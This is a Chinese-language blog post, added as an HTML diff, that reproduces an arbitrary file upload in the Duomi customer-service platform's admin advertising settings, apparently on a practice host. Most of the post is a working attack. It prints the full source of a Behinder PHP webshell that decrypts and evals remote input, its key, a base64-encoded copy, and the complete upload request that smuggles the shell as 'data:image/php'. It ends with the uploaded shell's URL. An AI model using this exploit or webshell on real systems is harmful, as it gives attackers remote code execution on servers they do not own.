@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="朵米客服平台存在后台任意文件上传漏洞，用户可以通过修改数据包，达到上传PHP文件的目的，并且可以自定义上传内容。 先注册一个账号，点击注册使用注册个账户  进入后台点击系统设置，广告设置，有很多个图片上传点 先随便上传一个图片抓包看看请求  抓包这里我们看到  上传的图片被编码成base64然后进行传输的 我们先准备一个冰蝎马 12345678910111213141516171819202122">
+<meta property="og:type" content="article">
+<meta property="og:title" content="朵米客服平台漏洞复现">
+<meta property="og:url" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="CrispSheep">
+<meta property="og:description" content="朵米客服平台存在后台任意文件上传漏洞，用户可以通过修改数据包，达到上传PHP文件的目的，并且可以自定义上传内容。 先注册一个账号，点击注册使用注册个账户  进入后台点击系统设置，广告设置，有很多个图片上传点 先随便上传一个图片抓包看看请求  抓包这里我们看到  上传的图片被编码成base64然后进行传输的 我们先准备一个冰蝎马 12345678910111213141516171819202122">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119131424060.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132014408.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132035724.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119134359631.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135313762.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135352900.png">
+<meta property="article:published_time" content="2025-01-19T12:40:00.000Z">
+<meta property="article:modified_time" content="2025-01-19T12:37:32.469Z">
+<meta property="article:author" content="CrispSheep">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119131424060.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>朵米客服平台漏洞复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- 字体样式 -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Noto+Sans+SC:normal,bold,italic">
+	<link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Fira+Code:normal,bold">
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&text=朵米客服平台漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&is_video=false&description=朵米客服平台漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=朵米客服平台漏洞复现&body=Check out this article: http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&name=朵米客服平台漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&t=朵米客服平台漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text">朵米客服平台</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        朵米客服平台漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">CrispSheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-19T12:40:00.000Z" class="dt-published" itemprop="datePublished">2025-01-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="朵米客服平台"><a href="#朵米客服平台" class="headerlink" title="朵米客服平台"></a>朵米客服平台</h1><p>存在后台任意文件上传漏洞，用户可以通过修改数据包，达到上传PHP文件的目的，并且可以自定义上传内容。</p>
+<p>先注册一个账号，点击注册使用注册个账户</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119131424060.png" alt="image-20250119131424060"></p>
+<p>进入后台点击系统设置，广告设置，有很多个图片上传点</p>
+<p>先随便上传一个图片抓包看看请求</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132014408.png" alt="image-20250119132014408"></p>
+<p>抓包这里我们看到</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132035724.png" alt="image-20250119132035724"></p>
+<p>上传的图片被编码成base64然后进行传输的</p>
+<p>我们先准备一个冰蝎马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;dfff0a7fa1a55c8c&quot;</span>; </span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的key就是连接密码的32位md5的前16位</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119134359631.png" alt="image-20250119134359631"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dfff<span class="number">0</span>a<span class="number">7</span>fa<span class="number">1</span>a<span class="number">55</span><span class="keyword">c</span><span class="number">8</span><span class="keyword">c</span></span><br></pre></td></tr></table></figure>
+
+<p>base64编码</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZGZmZjBhN2ZhMWE1NWM4YyI7IA0KCSRfU0VTU0lPTlsnayddPSRrZXk7DQoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOw0KCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQogICAgJGZ1bmM9JGFyclswXTsNCiAgICAkcGFyYW1zPSRhcnJbMV07DQoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQ0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOw0KPz4NCg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候我们再上传</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> /<span class="string">service</span>/<span class="string">Settingnow</span>/<span class="string">upload</span> <span class="string">HTTP</span>/<span class="string">1</span>.<span class="string">1</span></span><br><span class="line"><span class="string">Host</span>: <span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686</span></span><br><span class="line"><span class="string">Content-Length</span>: <span class="string">1853542</span></span><br><span class="line"><span class="string">User-Agent</span>: <span class="string">Mozilla</span>/<span class="string">5</span>.<span class="string">0</span> (<span class="string">Windows</span> <span class="string">NT</span> <span class="string">10</span>.<span class="string">0</span>; <span class="string">Win64</span>; <span class="string">x64</span>) <span class="string">AppleWebKit</span>/<span class="string">537</span>.<span class="string">36</span> (<span class="string">KHTML</span>, <span class="string">like</span> <span class="string">Gecko</span>) <span class="string">Chrome</span>/<span class="string">120</span>.<span class="string">0</span>.<span class="string">0</span>.<span class="string">0</span> <span class="string">Safari</span>/<span class="string">537</span>.<span class="string">36</span></span><br><span class="line"><span class="string">Content-type</span>: <span class="string">application</span>/<span class="string">x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Accept</span>: */*</span><br><span class="line"><span class="string">Origin</span>: <span class="string">http</span>://<span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686</span></span><br><span class="line"><span class="string">Referer</span>: <span class="string">http</span>://<span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686/service/settingnow/index</span></span><br><span class="line"><span class="string">Accept-Encoding</span>: <span class="string">gzip</span>, <span class="string">deflate</span></span><br><span class="line"><span class="string">Accept-Language</span>: <span class="string">zh-CN</span>,<span class="string">zh</span>;<span class="string">q</span>=<span class="string">0</span>.<span class="string">9</span></span><br><span class="line"><span class="string">Cookie</span>: <span class="string">PHPSESSID</span>=<span class="string">qe0n38i234st7t9n6o173a8as0</span>; <span class="string">JSESSIONID</span>=<span class="string">131B136C1A41F4A231559456AB0488E3</span>; <span class="string">service_token</span>=<span class="string">bc0cJPkl1nChQe8ieVAgLKTDiViTVGkpNf8tbaSN2</span>%<span class="string">252ForG0V1cw</span>%<span class="string">252F4uvQNdOgutzo</span></span><br><span class="line"><span class="string">Connection</span>: <span class="string">close</span></span><br><span class="line"></span><br><span class="line"><span class="string">img</span>=<span class="string">data:image/</span><span class="string">php</span>;<span class="string">base64</span>,<span class="string">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZGZmZjBhN2ZhMWE1NWM4YyI7IA0KCSRfU0VTU0lPTlsnayddPSRrZXk7DQoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOw0KCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQogICAgJGZ1bmM9JGFyclswXTsNCiAgICAkcGFyYW1zPSRhcnJbMV07DQoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQ0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOw0KPz4NCg</span>==</span><br></pre></td></tr></table></figure>
+
+<p>把图片的格式改成php，后面跟上木马的编码形式，拦截响应</p>
+<p>上传成功</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135313762.png" alt="image-20250119135313762"></p>
+<p>webshell的位置</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://node.hackhub.<span class="built_in">get</span>-<span class="built_in">shell</span>.com:<span class="number">41686</span>/upload/images/<span class="number">678</span>c93463b9592201.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135352900.png" alt="image-20250119135352900"></p>
+<p>成功连接</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text">朵米客服平台</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&text=朵米客服平台漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&is_video=false&description=朵米客服平台漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=朵米客服平台漏洞复现&body=Check out this article: http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
